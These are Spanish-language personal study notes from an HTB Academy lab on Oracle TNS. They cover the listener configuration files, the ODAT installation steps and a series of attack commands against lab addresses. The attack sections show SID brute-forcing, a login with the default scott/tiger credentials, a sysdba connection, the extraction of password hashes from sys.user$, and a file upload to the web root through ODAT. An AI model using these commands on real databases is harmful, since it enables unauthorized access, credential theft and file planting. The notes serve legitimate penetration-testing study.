# 1521 (Oracle TNS)

## Oracle TNS

> **NOTE** El servidor **Oracle Transparent Network Substrate (TNS)** es un protocolo de comunicación que facilita el intercambio de datos entre bases de datos Oracle y aplicaciones a través de redes. Parte de la suite Oracle Net Services, TNS admite diversos protocolos de red como TCP/IP, IPX/SPX y AppleTalk.

> **IMPORTANT** Con el tiempo, TNS ha evolucionado para soportar tecnologías como IPv6 y cifrado SSL/TLS, permitiendo:
>
> * Resolución de nombres
> * Gestión de conexiones
> * Equilibrio de carga
> * Mejora de la seguridad

***

### Configuración predeterminada

> **NOTE** Por defecto, el listener de Oracle TNS escucha en el puerto TCP **1521**. Esta configuración puede modificarse durante o después de la instalación editando los archivos de configuración.

#### Puerto y listener

* **Puerto por defecto**: TCP/1521
* **Protocolos admitidos**: TCP/IP, UDP, IPX/SPX, AppleTalk
* **Interfaces de red**: Puede configurarse para escuchar en IPs específicas o en todas las disponibles.

#### Administración remota

* En Oracle **8i** y **9i**, la administración remota del listener está habilitada.
* Desde Oracle **10g** y **11g**, viene deshabilitada por defecto.

#### Seguridad básica

1. **Hosts autorizados**: Solo conexiones desde hosts permitidos.
2. **Autenticación**: Basada en nombres de host, direcciones IP, usuario y contraseña.
3. **Cifrado**: Uso de Oracle Net Services para cifrar el tráfico entre cliente y servidor.

#### Archivos de configuración

* **tnsnames.ora**: Define alias de conexión, host, puerto y parámetros de conexión.

```bash
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

> **QUOTE** Este ejemplo define un servicio ORCL en 10.129.11.102:1521 al que se accede mediante el nombre de servicio `orcl`.

* **listener.ora**: Controla los puertos, protocolos y servicios a los que escucha el listener.

```bash
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

> **IMPORTANT** `tnsnames.ora` permite a los clientes resolver servicios, y `listener.ora` define cómo el listener maneja esas solicitudes.

> **CAUTION** La **PlsqlExclusionList** puede restringir el acceso a ciertas funciones PL/SQL desde Oracle Application Server. Se ubica en `$ORACLE_HOME/sqldeveloper`.

***

### Parámetros de conexión

| Configuración       | Descripción                                    |
| ------------------- | ---------------------------------------------- |
| DESCRIPTION         | Nombre de la base de datos y tipo de conexión. |
| ADDRESS             | Dirección de red (host y puerto).              |
| PROTOCOL            | Protocolo de red (TCP, IPC, etc).              |
| PORT                | Puerto de conexión.                            |
| CONNECT\_DATA       | Atributos como SERVICE\_NAME, SID, etc.        |
| INSTANCE\_NAME      | Nombre de instancia de base de datos.          |
| SERVICE\_NAME       | Nombre del servicio al que se conecta.         |
| SERVER              | Tipo de servidor (dedicado o compartido).      |
| USER                | Nombre de usuario para autenticación.          |
| PASSWORD            | Contraseña del usuario.                        |
| SECURITY            | Nivel de seguridad.                            |
| VALIDATE\_CERT      | Validación de certificados SSL/TLS.            |
| SSL\_VERSION        | Versión de SSL/TLS usada.                      |
| CONNECT\_TIMEOUT    | Tiempo límite de conexión.                     |
| RECEIVE\_TIMEOUT    | Tiempo límite para recibir respuesta.          |
| SEND\_TIMEOUT       | Tiempo límite para enviar solicitudes.         |
| SQLNET.EXPIRE\_TIME | Tiempo para detectar caídas de conexión.       |
| TRACE\_LEVEL        | Nivel de seguimiento.                          |
| TRACE\_DIRECTORY    | Directorio de logs de trazas.                  |
| TRACE\_FILE\_NAME   | Nombre del archivo de traza.                   |
| LOG\_FILE           | Archivo de registro de eventos.                |

***

### Herramientas necesarias

> **NOTE** Para interactuar con Oracle, debemos instalar las siguientes dependencias:

```bash
sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update

wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip

wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip

export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH

pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

> [Instalación de SQLPlus](https://www.geeksforgeeks.org/installation-guide/how-to-install-sqlplus-on-linux/)

***

### ODAT

> **NOTE** **Oracle Database Attacking Tool (ODAT)** es una herramienta en Python para pruebas de penetración sobre bases de datos Oracle.

```bash
./odat.py -h
```

***

### Enumeración

```bash
# Enumeración básica con nmap
sudo nmap -p1521 -sV 10.129.204.235 --open

# Fuerza bruta de SID
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

# Enumeración completa con ODAT
./odat.py all -s 10.129.204.235

# Interacción con credenciales conocidas
sqlplus scott/tiger@10.129.204.235/XE

# Fix para errores de SQLPlus
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"; sudo ldconfig
```

> **IMPORTANT** En Oracle, un **SID** identifica de forma única una instancia de base de datos. Cada instancia tiene procesos y memoria propios. El cliente debe especificar el SID en su cadena de conexión.

> [Documentación de comandos SQLPlus](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985)

***

### Interacción con Oracle

```bash
# Listar todas las tablas
select table_name from all_tables;

# Consultar contenido de una tabla
select * from user_role_privs;

# Conexión como sysdba
sqlplus scott/tiger@10.129.204.235/XE as sysdba

# Consultar privilegios
select * from user_role_privs;

# Extraer hashes de contraseña
select name, password from sys.user$;
```

> **TIP** Podemos subir un archivo al servidor si conocemos la ruta del directorio web:

| Sistema operativo | Ruta web por defecto |
| ----------------- | -------------------- |
| Linux             | /var/www/html        |
| Windows           | C:\inetpub\wwwroot   |

```bash
# Subir archivo
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

# Verificación
curl -X GET http://10.129.204.235/testing.txt
```

***

### Redes sociales

* LinkedIn: [https://www.linkedin.com/in/tuch0/](https://www.linkedin.com/in/tuch0/)
* Instagram: [https://www.instagram.com/tuch0\_/](https://www.instagram.com/tuch0_/)
* YouTube: [https://www.youtube.com/@tuch0](https://www.youtube.com/@tuch0)\_
* GitHub: [https://github.com/Tuch0](https://github.com/Tuch0)
* Web personal: [https://tuch0.com/](https://tuch0.com/)

> 📄 Apuntes personales de HTB Academy. Para uso educativo.
